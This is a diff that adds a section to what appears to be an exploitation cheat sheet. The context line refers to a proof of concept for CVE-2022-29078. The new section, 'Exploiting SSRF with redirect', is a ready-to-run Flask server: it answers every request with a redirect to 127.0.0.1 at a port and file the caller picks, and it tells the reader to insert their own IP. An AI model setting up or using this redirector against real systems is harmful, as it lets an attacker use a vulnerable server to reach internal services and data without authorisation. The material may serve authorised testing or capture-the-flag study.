@@ -1039,6 +1039,30 @@ The poc below bypasses the fix for `CVE-2022-29078` in `^3.1.7`
 
 ------------------
 
+### Exploiting SSRF with redirect
+
+- See the code below,change the host keyword to your ip
+
+      #! /usr/bin/env python3
+      from flask import Flask, redirect,request
+      from urllib.parse import quote
+      app = Flask(__name__)    
+      
+      @app.route('/',methods=['GET'])    
+      def root():
+          port = request.args.get("port")
+          file = request.args.get("file")
+          if file != None:
+              url =  f"http://127.0.0.1:{port}/{file}"
+          else:
+              url = f"http://127.0.0.1:{port}/"
+          return redirect(url, code=301)
+          
+      if __name__ == "__main__":
+          app.run(host="<ip>", port=8080)
+
+----------------------
+
 
 
 
